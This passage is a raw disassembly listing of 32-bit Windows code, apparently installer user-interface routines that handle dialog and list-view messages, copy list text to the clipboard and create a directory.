  405055:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  405058:	74 3f                	je     0x405099
  40505a:	ff 35 28 0d 42 00    	push   0x420d28
  405060:	e8 7d c2 ff ff       	call   0x4012e2
  405065:	8b f8                	mov    %eax,%edi
  405067:	57                   	push   %edi
  405068:	e8 2c c2 ff ff       	call   0x401299
  40506d:	33 c0                	xor    %eax,%eax
  40506f:	33 c9                	xor    %ecx,%ecx
  405071:	3b fb                	cmp    %ebx,%edi
  405073:	7e 0e                	jle    0x405083
  405075:	8b 55 e8             	mov    -0x18(%ebp),%edx
  405078:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  40507b:	74 01                	je     0x40507e
  40507d:	41                   	inc    %ecx
  40507e:	40                   	inc    %eax
  40507f:	3b c7                	cmp    %edi,%eax
  405081:	7c f2                	jl     0x405075
  405083:	53                   	push   %ebx
  405084:	51                   	push   %ecx
  405085:	68 4e 01 00 00       	push   $0x14e
  40508a:	ff 75 f8             	push   -0x8(%ebp)
  40508d:	ff d6                	call   *%esi
  40508f:	89 7d 14             	mov    %edi,0x14(%ebp)
  405092:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  405099:	53                   	push   %ebx
  40509a:	53                   	push   %ebx
  40509b:	e8 4f c1 ff ff       	call   0x4011ef
  4050a0:	a1 28 0d 42 00       	mov    0x420d28,%eax
  4050a5:	39 1d 6c 47 42 00    	cmp    %ebx,0x42476c
  4050ab:	89 45 e0             	mov    %eax,-0x20(%ebp)
  4050ae:	a1 68 47 42 00       	mov    0x424768,%eax
  4050b3:	c7 45 c4 30 f0 00 00 	movl   $0xf030,-0x3c(%ebp)
  4050ba:	89 5d ec             	mov    %ebx,-0x14(%ebp)
  4050bd:	0f 8e 9c 00 00 00    	jle    0x40515f
  4050c3:	8d 78 08             	lea    0x8(%eax),%edi
  4050c6:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4050c9:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  4050cc:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  4050cf:	3b c3                	cmp    %ebx,%eax
  4050d1:	74 74                	je     0x405147
  4050d3:	8b 0f                	mov    (%edi),%ecx
  4050d5:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4050d8:	f6 c5 01             	test   $0x1,%ch
  4050db:	c7 45 b8 08 00 00 00 	movl   $0x8,-0x48(%ebp)
  4050e2:	74 11                	je     0x4050f5
  4050e4:	8d 47 10             	lea    0x10(%edi),%eax
  4050e7:	c7 45 b8 09 00 00 00 	movl   $0x9,-0x48(%ebp)
  4050ee:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4050f1:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  4050f5:	f6 c1 40             	test   $0x40,%cl
  4050f8:	74 05                	je     0x4050ff
  4050fa:	6a 03                	push   $0x3
  4050fc:	58                   	pop    %eax
  4050fd:	eb 0e                	jmp    0x40510d
  4050ff:	8b c1                	mov    %ecx,%eax
  405101:	83 e0 01             	and    $0x1,%eax
  405104:	40                   	inc    %eax
  405105:	f6 c1 10             	test   $0x10,%cl
  405108:	74 03                	je     0x40510d
  40510a:	83 c0 03             	add    $0x3,%eax
  40510d:	8b d1                	mov    %ecx,%edx
  40510f:	ff 75 bc             	push   -0x44(%ebp)
  405112:	c1 e0 0b             	shl    $0xb,%eax
  405115:	83 e2 08             	and    $0x8,%edx
  405118:	0b c2                	or     %edx,%eax
  40511a:	8b d1                	mov    %ecx,%edx
  40511c:	c1 f9 05             	sar    $0x5,%ecx
  40511f:	03 c0                	add    %eax,%eax
  405121:	83 e2 20             	and    $0x20,%edx
  405124:	83 e1 01             	and    $0x1,%ecx
  405127:	0b c2                	or     %edx,%eax
  405129:	41                   	inc    %ecx
  40512a:	89 45 c0             	mov    %eax,-0x40(%ebp)
  40512d:	51                   	push   %ecx
  40512e:	68 02 11 00 00       	push   $0x1102
  405133:	ff 75 fc             	push   -0x4(%ebp)
  405136:	ff d6                	call   *%esi
  405138:	8d 45 b8             	lea    -0x48(%ebp),%eax
  40513b:	50                   	push   %eax
  40513c:	53                   	push   %ebx
  40513d:	68 0d 11 00 00       	push   $0x110d
  405142:	ff 75 fc             	push   -0x4(%ebp)
  405145:	ff d6                	call   *%esi
  405147:	ff 45 ec             	incl   -0x14(%ebp)
  40514a:	81 c7 18 04 00 00    	add    $0x418,%edi
  405150:	8b 45 ec             	mov    -0x14(%ebp),%eax
  405153:	3b 05 6c 47 42 00    	cmp    0x42476c,%eax
  405159:	0f 8c 67 ff ff ff    	jl     0x4050c6
  40515f:	6a 01                	push   $0x1
  405161:	53                   	push   %ebx
  405162:	ff 75 fc             	push   -0x4(%ebp)
  405165:	ff 15 fc 81 40 00    	call   *0x4081fc
  40516b:	a1 fc 3e 42 00       	mov    0x423efc,%eax
  405170:	39 58 10             	cmp    %ebx,0x10(%eax)
  405173:	74 14                	je     0x405189
  405175:	6a 05                	push   $0x5
  405177:	e8 79 f9 ff ff       	call   0x404af5
  40517c:	50                   	push   %eax
  40517d:	6a fb                	push   $0xfffffffb
  40517f:	68 ff 03 00 00       	push   $0x3ff
  405184:	e8 54 f9 ff ff       	call   0x404add
  405189:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  405190:	75 35                	jne    0x4051c7
  405192:	f6 05 3d 47 42 00 01 	testb  $0x1,0x42473d
  405199:	74 2c                	je     0x4051c7
  40519b:	33 c0                	xor    %eax,%eax
  40519d:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  4051a1:	8b 35 48 82 40 00    	mov    0x408248,%esi
  4051a7:	0f 94 c0             	sete   %al
  4051aa:	c1 e0 03             	shl    $0x3,%eax
  4051ad:	8b f8                	mov    %eax,%edi
  4051af:	57                   	push   %edi
  4051b0:	ff 75 fc             	push   -0x4(%ebp)
  4051b3:	ff d6                	call   *%esi
  4051b5:	57                   	push   %edi
  4051b6:	68 fe 03 00 00       	push   $0x3fe
  4051bb:	ff 75 08             	push   0x8(%ebp)
  4051be:	ff 15 d0 81 40 00    	call   *0x4081d0
  4051c4:	50                   	push   %eax
  4051c5:	ff d6                	call   *%esi
  4051c7:	ff 75 14             	push   0x14(%ebp)
  4051ca:	ff 75 10             	push   0x10(%ebp)
  4051cd:	ff 75 0c             	push   0xc(%ebp)
  4051d0:	e8 61 f0 ff ff       	call   0x404236
  4051d5:	5f                   	pop    %edi
  4051d6:	5e                   	pop    %esi
  4051d7:	5b                   	pop    %ebx
  4051d8:	c9                   	leave
  4051d9:	c2 10 00             	ret    $0x10
  4051dc:	55                   	push   %ebp
  4051dd:	8b ec                	mov    %esp,%ebp
  4051df:	53                   	push   %ebx
  4051e0:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4051e3:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4051e9:	57                   	push   %edi
  4051ea:	75 14                	jne    0x405200
  4051ec:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  4051f0:	75 59                	jne    0x40524b
  4051f2:	68 13 04 00 00       	push   $0x413
  4051f7:	e8 1f f0 ff ff       	call   0x40421b
  4051fc:	33 c0                	xor    %eax,%eax
  4051fe:	eb 62                	jmp    0x405262
  405200:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  405206:	75 20                	jne    0x405228
  405208:	ff 75 08             	push   0x8(%ebp)
  40520b:	ff 15 b4 81 40 00    	call   *0x4081b4
  405211:	85 c0                	test   %eax,%eax
  405213:	74 36                	je     0x40524b
  405215:	6a 01                	push   $0x1
  405217:	ff 75 08             	push   0x8(%ebp)
  40521a:	e8 03 f9 ff ff       	call   0x404b22
  40521f:	8b f8                	mov    %eax,%edi
  405221:	bb 19 04 00 00       	mov    $0x419,%ebx
  405226:	eb 03                	jmp    0x40522b
  405228:	8b 7d 14             	mov    0x14(%ebp),%edi
  40522b:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  405231:	75 1b                	jne    0x40524e
  405233:	39 3d 1c 0d 42 00    	cmp    %edi,0x420d1c
  405239:	74 13                	je     0x40524e
  40523b:	57                   	push   %edi
  40523c:	6a 06                	push   $0x6
  40523e:	89 3d 1c 0d 42 00    	mov    %edi,0x420d1c
  405244:	e8 59 f9 ff ff       	call   0x404ba2
  405249:	eb 03                	jmp    0x40524e
  40524b:	8b 7d 14             	mov    0x14(%ebp),%edi
  40524e:	57                   	push   %edi
  40524f:	ff 75 10             	push   0x10(%ebp)
  405252:	53                   	push   %ebx
  405253:	ff 75 08             	push   0x8(%ebp)
  405256:	ff 35 24 0d 42 00    	push   0x420d24
  40525c:	ff 15 b0 81 40 00    	call   *0x4081b0
  405262:	5f                   	pop    %edi
  405263:	5b                   	pop    %ebx
  405264:	5d                   	pop    %ebp
  405265:	c2 10 00             	ret    $0x10
  405268:	55                   	push   %ebp
  405269:	8b ec                	mov    %esp,%ebp
  40526b:	83 ec 30             	sub    $0x30,%esp
  40526e:	a1 04 3f 42 00       	mov    0x423f04,%eax
  405273:	53                   	push   %ebx
  405274:	33 db                	xor    %ebx,%ebx
  405276:	56                   	push   %esi
  405277:	3b c3                	cmp    %ebx,%eax
  405279:	57                   	push   %edi
  40527a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40527d:	0f 84 b0 00 00 00    	je     0x405333
  405283:	a1 f4 47 42 00       	mov    0x4247f4,%eax
  405288:	be 10 05 42 00       	mov    $0x420510,%esi
  40528d:	8b f8                	mov    %eax,%edi
  40528f:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405292:	83 e7 01             	and    $0x1,%edi
  405295:	75 09                	jne    0x4052a0
  405297:	ff 75 08             	push   0x8(%ebp)
  40529a:	56                   	push   %esi
  40529b:	e8 c3 0e 00 00       	call   0x406163
  4052a0:	56                   	push   %esi
  4052a1:	e8 b1 0e 00 00       	call   0x406157
  4052a6:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4052a9:	89 45 08             	mov    %eax,0x8(%ebp)
  4052ac:	74 1b                	je     0x4052c9
  4052ae:	ff 75 0c             	push   0xc(%ebp)
  4052b1:	e8 a1 0e 00 00       	call   0x406157
  4052b6:	03 45 08             	add    0x8(%ebp),%eax
  4052b9:	3d 00 08 00 00       	cmp    $0x800,%eax
  4052be:	73 73                	jae    0x405333
  4052c0:	ff 75 0c             	push   0xc(%ebp)
  4052c3:	56                   	push   %esi
  4052c4:	e8 94 0e 00 00       	call   0x40615d
  4052c9:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4052cd:	75 0d                	jne    0x4052dc
  4052cf:	56                   	push   %esi
  4052d0:	ff 35 e8 3e 42 00    	push   0x423ee8
  4052d6:	ff 15 40 82 40 00    	call   *0x408240
  4052dc:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4052e0:	75 44                	jne    0x405326
  4052e2:	53                   	push   %ebx
  4052e3:	53                   	push   %ebx
  4052e4:	68 04 10 00 00       	push   $0x1004
  4052e9:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4052ec:	ff 75 fc             	push   -0x4(%ebp)
  4052ef:	8b 35 00 82 40 00    	mov    0x408200,%esi
  4052f5:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  4052fc:	ff d6                	call   *%esi
  4052fe:	2b c7                	sub    %edi,%eax
  405300:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  405303:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405306:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405309:	50                   	push   %eax
  40530a:	b8 07 10 00 00       	mov    $0x1007,%eax
  40530f:	2b c7                	sub    %edi,%eax
  405311:	53                   	push   %ebx
  405312:	50                   	push   %eax
  405313:	ff 75 fc             	push   -0x4(%ebp)
  405316:	ff d6                	call   *%esi
  405318:	53                   	push   %ebx
  405319:	ff 75 d4             	push   -0x2c(%ebp)
  40531c:	68 13 10 00 00       	push   $0x1013
  405321:	ff 75 fc             	push   -0x4(%ebp)
  405324:	ff d6                	call   *%esi
  405326:	3b fb                	cmp    %ebx,%edi
  405328:	74 09                	je     0x405333
  40532a:	8b 45 08             	mov    0x8(%ebp),%eax
  40532d:	88 98 10 05 42 00    	mov    %bl,0x420510(%eax)
  405333:	5f                   	pop    %edi
  405334:	5e                   	pop    %esi
  405335:	5b                   	pop    %ebx
  405336:	c9                   	leave
  405337:	c2 08 00             	ret    $0x8
  40533a:	56                   	push   %esi
  40533b:	8b 35 68 47 42 00    	mov    0x424768,%esi
  405341:	57                   	push   %edi
  405342:	8b 3d 6c 47 42 00    	mov    0x42476c,%edi
  405348:	6a 00                	push   $0x0
  40534a:	ff 15 84 82 40 00    	call   *0x408284
  405350:	09 05 f8 47 42 00    	or     %eax,0x4247f8
  405356:	6a 00                	push   $0x0
  405358:	e8 be ee ff ff       	call   0x40421b
  40535d:	85 ff                	test   %edi,%edi
  40535f:	74 2b                	je     0x40538c
  405361:	83 c6 0c             	add    $0xc,%esi
  405364:	4f                   	dec    %edi
  405365:	f6 46 fc 01          	testb  $0x1,-0x4(%esi)
  405369:	74 0f                	je     0x40537a
  40536b:	ff 74 24 0c          	push   0xc(%esp)
  40536f:	ff 36                	push   (%esi)
  405371:	e8 13 c0 ff ff       	call   0x401389
  405376:	85 c0                	test   %eax,%eax
  405378:	75 0c                	jne    0x405386
  40537a:	81 c6 18 04 00 00    	add    $0x418,%esi
  405380:	85 ff                	test   %edi,%edi
  405382:	75 e0                	jne    0x405364
  405384:	eb 06                	jmp    0x40538c
  405386:	ff 05 cc 47 42 00    	incl   0x4247cc
  40538c:	68 04 04 00 00       	push   $0x404
  405391:	e8 85 ee ff ff       	call   0x40421b
  405396:	ff 15 80 82 40 00    	call   *0x408280
  40539c:	a1 cc 47 42 00       	mov    0x4247cc,%eax
  4053a1:	5f                   	pop    %edi
  4053a2:	5e                   	pop    %esi
  4053a3:	c2 04 00             	ret    $0x4
  4053a6:	55                   	push   %ebp
  4053a7:	8b ec                	mov    %esp,%ebp
  4053a9:	83 ec 3c             	sub    $0x3c,%esp
  4053ac:	a1 04 3f 42 00       	mov    0x423f04,%eax
  4053b1:	53                   	push   %ebx
  4053b2:	56                   	push   %esi
  4053b3:	57                   	push   %edi
  4053b4:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4053b7:	33 db                	xor    %ebx,%ebx
  4053b9:	81 ff 10 01 00 00    	cmp    $0x110,%edi
  4053bf:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4053c2:	0f 85 89 01 00 00    	jne    0x405551
  4053c8:	83 4d d4 ff          	orl    $0xffffffff,-0x2c(%ebp)
  4053cc:	83 4d e0 ff          	orl    $0xffffffff,-0x20(%ebp)
  4053d0:	6a 02                	push   $0x2
  4053d2:	33 c0                	xor    %eax,%eax
  4053d4:	5e                   	pop    %esi
  4053d5:	8d 7d e4             	lea    -0x1c(%ebp),%edi
  4053d8:	89 75 cc             	mov    %esi,-0x34(%ebp)
  4053db:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  4053de:	89 5d d8             	mov    %ebx,-0x28(%ebp)
  4053e1:	89 5d dc             	mov    %ebx,-0x24(%ebp)
  4053e4:	ab                   	stos   %eax,%es:(%edi)
  4053e5:	ab                   	stos   %eax,%es:(%edi)
  4053e6:	a1 34 47 42 00       	mov    0x424734,%eax
  4053eb:	8b 3d d0 81 40 00    	mov    0x4081d0,%edi
  4053f1:	68 03 04 00 00       	push   $0x403
  4053f6:	8b 48 5c             	mov    0x5c(%eax),%ecx
  4053f9:	8b 40 60             	mov    0x60(%eax),%eax
  4053fc:	ff 75 08             	push   0x8(%ebp)
  4053ff:	89 4d 10             	mov    %ecx,0x10(%ebp)
  405402:	89 45 0c             	mov    %eax,0xc(%ebp)
  405405:	ff d7                	call   *%edi
  405407:	68 ee 03 00 00       	push   $0x3ee
  40540c:	a3 f0 3e 42 00       	mov    %eax,0x423ef0
  405411:	ff 75 08             	push   0x8(%ebp)
  405414:	ff d7                	call   *%edi
  405416:	68 f8 03 00 00       	push   $0x3f8
  40541b:	a3 e8 3e 42 00       	mov    %eax,0x423ee8
  405420:	ff 75 08             	push   0x8(%ebp)
  405423:	ff d7                	call   *%edi
  405425:	ff 35 f0 3e 42 00    	push   0x423ef0
  40542b:	a3 04 3f 42 00       	mov    %eax,0x423f04
  405430:	89 45 fc             	mov    %eax,-0x4(%ebp)
  405433:	e8 cc ed ff ff       	call   0x404204
  405438:	6a 04                	push   $0x4
  40543a:	e8 b6 f6 ff ff       	call   0x404af5
  40543f:	a3 f4 3e 42 00       	mov    %eax,0x423ef4
  405444:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405447:	50                   	push   %eax
  405448:	89 1d 0c 3f 42 00    	mov    %ebx,0x423f0c
  40544e:	ff 75 fc             	push   -0x4(%ebp)
  405451:	ff 15 0c 82 40 00    	call   *0x40820c
  405457:	56                   	push   %esi
  405458:	ff 15 d4 81 40 00    	call   *0x4081d4
  40545e:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  405461:	8b 35 00 82 40 00    	mov    0x408200,%esi
  405467:	2b c8                	sub    %eax,%ecx
  405469:	8d 45 cc             	lea    -0x34(%ebp),%eax
  40546c:	50                   	push   %eax
  40546d:	53                   	push   %ebx
  40546e:	68 1b 10 00 00       	push   $0x101b
  405473:	89 4d d4             	mov    %ecx,-0x2c(%ebp)
  405476:	ff 75 fc             	push   -0x4(%ebp)
  405479:	ff d6                	call   *%esi
  40547b:	b8 00 40 00 00       	mov    $0x4000,%eax
  405480:	50                   	push   %eax
  405481:	50                   	push   %eax
  405482:	68 36 10 00 00       	push   $0x1036
  405487:	ff 75 fc             	push   -0x4(%ebp)
  40548a:	ff d6                	call   *%esi
  40548c:	39 5d 10             	cmp    %ebx,0x10(%ebp)
  40548f:	7c 1c                	jl     0x4054ad
  405491:	ff 75 10             	push   0x10(%ebp)
  405494:	53                   	push   %ebx
  405495:	68 01 10 00 00       	push   $0x1001
  40549a:	ff 75 fc             	push   -0x4(%ebp)
  40549d:	ff d6                	call   *%esi
  40549f:	ff 75 10             	push   0x10(%ebp)
  4054a2:	53                   	push   %ebx
  4054a3:	68 26 10 00 00       	push   $0x1026
  4054a8:	ff 75 fc             	push   -0x4(%ebp)
  4054ab:	ff d6                	call   *%esi
  4054ad:	39 5d 0c             	cmp    %ebx,0xc(%ebp)
  4054b0:	7c 0e                	jl     0x4054c0
  4054b2:	ff 75 0c             	push   0xc(%ebp)
  4054b5:	53                   	push   %ebx
  4054b6:	68 24 10 00 00       	push   $0x1024
  4054bb:	ff 75 fc             	push   -0x4(%ebp)
  4054be:	ff d6                	call   *%esi
  4054c0:	8b 45 14             	mov    0x14(%ebp),%eax
  4054c3:	ff 70 30             	push   0x30(%eax)
  4054c6:	6a 1b                	push   $0x1b
  4054c8:	ff 75 08             	push   0x8(%ebp)
  4054cb:	e8 ff ec ff ff       	call   0x4041cf
  4054d0:	f6 05 3c 47 42 00 03 	testb  $0x3,0x42473c
  4054d7:	74 34                	je     0x40550d
  4054d9:	53                   	push   %ebx
  4054da:	ff 35 f0 3e 42 00    	push   0x423ef0
  4054e0:	ff 15 48 82 40 00    	call   *0x408248
  4054e6:	f6 05 3c 47 42 00 02 	testb  $0x2,0x42473c
  4054ed:	75 0d                	jne    0x4054fc
  4054ef:	6a 08                	push   $0x8
  4054f1:	ff 75 fc             	push   -0x4(%ebp)
  4054f4:	ff 15 48 82 40 00    	call   *0x408248
  4054fa:	eb 06                	jmp    0x405502
  4054fc:	89 1d f0 3e 42 00    	mov    %ebx,0x423ef0
  405502:	ff 35 e8 3e 42 00    	push   0x423ee8
  405508:	e8 f7 ec ff ff       	call   0x404204
  40550d:	68 ec 03 00 00       	push   $0x3ec
  405512:	ff 75 08             	push   0x8(%ebp)
  405515:	ff d7                	call   *%edi
  405517:	68 00 00 30 75       	push   $0x75300000
  40551c:	8b f8                	mov    %eax,%edi
  40551e:	53                   	push   %ebx
  40551f:	68 01 04 00 00       	push   $0x401
  405524:	57                   	push   %edi
  405525:	ff d6                	call   *%esi
  405527:	f6 05 3c 47 42 00 04 	testb  $0x4,0x42473c
  40552e:	0f 84 f3 01 00 00    	je     0x405727
  405534:	ff 75 0c             	push   0xc(%ebp)
  405537:	53                   	push   %ebx
  405538:	68 09 04 00 00       	push   $0x409
  40553d:	57                   	push   %edi
  40553e:	ff d6                	call   *%esi
  405540:	ff 75 10             	push   0x10(%ebp)
  405543:	53                   	push   %ebx
  405544:	68 01 20 00 00       	push   $0x2001
  405549:	57                   	push   %edi
  40554a:	ff d6                	call   *%esi
  40554c:	e9 d6 01 00 00       	jmp    0x405727
  405551:	81 ff 05 04 00 00    	cmp    $0x405,%edi
  405557:	75 28                	jne    0x405581
  405559:	8d 45 0c             	lea    0xc(%ebp),%eax
  40555c:	50                   	push   %eax
  40555d:	53                   	push   %ebx
  40555e:	68 ec 03 00 00       	push   $0x3ec
  405563:	ff 75 08             	push   0x8(%ebp)
  405566:	ff 15 d0 81 40 00    	call   *0x4081d0
  40556c:	50                   	push   %eax
  40556d:	68 3a 53 40 00       	push   $0x40533a
  405572:	53                   	push   %ebx
  405573:	53                   	push   %ebx
  405574:	ff 15 bc 80 40 00    	call   *0x4080bc
  40557a:	50                   	push   %eax
  40557b:	ff 15 14 81 40 00    	call   *0x408114
  405581:	8b 35 48 82 40 00    	mov    0x408248,%esi
  405587:	81 ff 11 01 00 00    	cmp    $0x111,%edi
  40558d:	75 20                	jne    0x4055af
  40558f:	66 81 7d 10 03 04    	cmpw   $0x403,0x10(%ebp)
  405595:	75 39                	jne    0x4055d0
  405597:	53                   	push   %ebx
  405598:	ff 35 f0 3e 42 00    	push   0x423ef0
  40559e:	ff d6                	call   *%esi
  4055a0:	6a 08                	push   $0x8
  4055a2:	ff 75 fc             	push   -0x4(%ebp)
  4055a5:	ff d6                	call   *%esi
  4055a7:	ff 75 fc             	push   -0x4(%ebp)
  4055aa:	e8 55 ec ff ff       	call   0x404204
  4055af:	81 ff 04 04 00 00    	cmp    $0x404,%edi
  4055b5:	75 53                	jne    0x40560a
  4055b7:	39 1d ec 3e 42 00    	cmp    %ebx,0x423eec
  4055bd:	74 24                	je     0x4055e3
  4055bf:	6a 78                	push   $0x78
  4055c1:	c7 05 00 01 42 00 02 	movl   $0x2,0x420100
  4055c8:	00 00 00 
  4055cb:	e8 d8 eb ff ff       	call   0x4041a8
  4055d0:	ff 75 14             	push   0x14(%ebp)
  4055d3:	ff 75 10             	push   0x10(%ebp)
  4055d6:	57                   	push   %edi
  4055d7:	e8 5a ec ff ff       	call   0x404236
  4055dc:	5f                   	pop    %edi
  4055dd:	5e                   	pop    %esi
  4055de:	5b                   	pop    %ebx
  4055df:	c9                   	leave
  4055e0:	c2 10 00             	ret    $0x10
  4055e3:	6a 08                	push   $0x8
  4055e5:	ff 35 28 47 42 00    	push   0x424728
  4055eb:	ff d6                	call   *%esi
  4055ed:	39 1d cc 47 42 00    	cmp    %ebx,0x4247cc
  4055f3:	75 0e                	jne    0x405603
  4055f5:	a1 08 05 42 00       	mov    0x420508,%eax
  4055fa:	53                   	push   %ebx
  4055fb:	ff 70 34             	push   0x34(%eax)
  4055fe:	e8 65 fc ff ff       	call   0x405268
  405603:	6a 01                	push   $0x1
  405605:	e8 9e eb ff ff       	call   0x4041a8
  40560a:	83 ff 7b             	cmp    $0x7b,%edi
  40560d:	75 c1                	jne    0x4055d0
  40560f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  405612:	39 45 10             	cmp    %eax,0x10(%ebp)
  405615:	75 b9                	jne    0x4055d0
  405617:	53                   	push   %ebx
  405618:	53                   	push   %ebx
  405619:	68 04 10 00 00       	push   $0x1004
  40561e:	50                   	push   %eax
  40561f:	ff 15 00 82 40 00    	call   *0x408200
  405625:	3b c3                	cmp    %ebx,%eax
  405627:	89 45 10             	mov    %eax,0x10(%ebp)
  40562a:	0f 8e f7 00 00 00    	jle    0x405727
  405630:	ff 15 64 82 40 00    	call   *0x408264
  405636:	6a e1                	push   $0xffffffe1
  405638:	53                   	push   %ebx
  405639:	8b f0                	mov    %eax,%esi
  40563b:	e8 23 0b 00 00       	call   0x406163
  405640:	50                   	push   %eax
  405641:	6a 01                	push   $0x1
  405643:	53                   	push   %ebx
  405644:	56                   	push   %esi
  405645:	ff 15 5c 82 40 00    	call   *0x40825c
  40564b:	8b 4d 14             	mov    0x14(%ebp),%ecx
  40564e:	0f bf 45 14          	movswl 0x14(%ebp),%eax
  405652:	c1 e9 10             	shr    $0x10,%ecx
  405655:	83 7d 14 ff          	cmpl   $0xffffffff,0x14(%ebp)
  405659:	0f bf c9             	movswl %cx,%ecx
  40565c:	75 13                	jne    0x405671
  40565e:	8d 45 ec             	lea    -0x14(%ebp),%eax
  405661:	50                   	push   %eax
  405662:	ff 75 fc             	push   -0x4(%ebp)
  405665:	ff 15 cc 81 40 00    	call   *0x4081cc
  40566b:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40566e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  405671:	53                   	push   %ebx
  405672:	ff 75 08             	push   0x8(%ebp)
  405675:	53                   	push   %ebx
  405676:	51                   	push   %ecx
  405677:	50                   	push   %eax
  405678:	68 80 01 00 00       	push   $0x180
  40567d:	56                   	push   %esi
  40567e:	ff 15 60 82 40 00    	call   *0x408260
  405684:	83 f8 01             	cmp    $0x1,%eax
  405687:	0f 85 9a 00 00 00    	jne    0x405727
  40568d:	8b 45 10             	mov    0x10(%ebp),%eax
  405690:	33 f6                	xor    %esi,%esi
  405692:	46                   	inc    %esi
  405693:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  405696:	c7 45 d8 30 0d 42 00 	movl   $0x420d30,-0x28(%ebp)
  40569d:	c7 45 dc 00 10 00 00 	movl   $0x1000,-0x24(%ebp)
  4056a4:	89 45 08             	mov    %eax,0x8(%ebp)
  4056a7:	bf 2d 10 00 00       	mov    $0x102d,%edi
  4056ac:	ff 4d 08             	decl   0x8(%ebp)
  4056af:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4056b2:	50                   	push   %eax
  4056b3:	ff 75 08             	push   0x8(%ebp)
  4056b6:	57                   	push   %edi
  4056b7:	ff 75 fc             	push   -0x4(%ebp)
  4056ba:	ff 15 00 82 40 00    	call   *0x408200
  4056c0:	39 5d 08             	cmp    %ebx,0x8(%ebp)
  4056c3:	8d 74 06 02          	lea    0x2(%esi,%eax,1),%esi
  4056c7:	75 e3                	jne    0x4056ac
  4056c9:	53                   	push   %ebx
  4056ca:	ff 15 c4 81 40 00    	call   *0x4081c4
  4056d0:	ff 15 c0 81 40 00    	call   *0x4081c0
  4056d6:	56                   	push   %esi
  4056d7:	6a 42                	push   $0x42
  4056d9:	ff 15 58 81 40 00    	call   *0x408158
  4056df:	50                   	push   %eax
  4056e0:	89 45 08             	mov    %eax,0x8(%ebp)
  4056e3:	ff 15 b8 80 40 00    	call   *0x4080b8
  4056e9:	8b f0                	mov    %eax,%esi
  4056eb:	8d 45 c4             	lea    -0x3c(%ebp),%eax
  4056ee:	89 75 d8             	mov    %esi,-0x28(%ebp)
  4056f1:	50                   	push   %eax
  4056f2:	53                   	push   %ebx
  4056f3:	57                   	push   %edi
  4056f4:	ff 75 fc             	push   -0x4(%ebp)
  4056f7:	ff 15 00 82 40 00    	call   *0x408200
  4056fd:	03 f0                	add    %eax,%esi
  4056ff:	c6 06 0d             	movb   $0xd,(%esi)
  405702:	46                   	inc    %esi
  405703:	c6 06 0a             	movb   $0xa,(%esi)
  405706:	46                   	inc    %esi
  405707:	43                   	inc    %ebx
  405708:	3b 5d 10             	cmp    0x10(%ebp),%ebx
  40570b:	7c de                	jl     0x4056eb
  40570d:	ff 75 08             	push   0x8(%ebp)
  405710:	ff 15 1c 81 40 00    	call   *0x40811c
  405716:	ff 75 08             	push   0x8(%ebp)
  405719:	6a 01                	push   $0x1
  40571b:	ff 15 bc 81 40 00    	call   *0x4081bc
  405721:	ff 15 b8 81 40 00    	call   *0x4081b8
  405727:	33 c0                	xor    %eax,%eax
  405729:	e9 ae fe ff ff       	jmp    0x4055dc
  40572e:	55                   	push   %ebp
  40572f:	8b ec                	mov    %esp,%ebp
  405731:	83 ec 20             	sub    $0x20,%esp
  405734:	b8 7c 83 40 00       	mov    $0x40837c,%eax
  405739:	80 65 e1 00          	andb   $0x0,-0x1f(%ebp)
  40573d:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  405740:	89 45 e8             	mov    %eax,-0x18(%ebp)
  405743:	8d 45 e0             	lea    -0x20(%ebp),%eax
  405746:	83 65 ec 00          	andl   $0x0,-0x14(%ebp)
  40574a:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40574e:	89 45 f8             	mov    %eax,-0x8(%ebp)
  405751:	8d 45 f4             	lea    -0xc(%ebp),%eax
  405754:	56                   	push   %esi
  405755:	50                   	push   %eax
  405756:	c6 45 e0 01          	movb   $0x1,-0x20(%ebp)
  40575a:	ff 75 08             	push   0x8(%ebp)
  40575d:	66 c7 45 e2 04 00    	movw   $0x4,-0x1e(%ebp)
  405763:	c7 45 f0 6c 83 40 00 	movl   $0x40836c,-0x10(%ebp)
  40576a:	c7 45 f4 0c 00 00 00 	movl   $0xc,-0xc(%ebp)
  405771:	ff 15 c4 80 40 00    	call   *0x4080c4
  405777:	85 c0                	test   %eax,%eax
  405779:	74 04                	je     0x40577f
  40577b:	33 c0                	xor    %eax,%eax
  40577d:	eb 27                	jmp    0x4057a6
  40577f:	8b 35 c0 80 40 00    	mov    0x4080c0,%esi
  405785:	ff d6                	call   *%esi
  405787:	3d b7 00 00 00       	cmp    $0xb7,%eax
  40578c:	75 18                	jne    0x4057a6
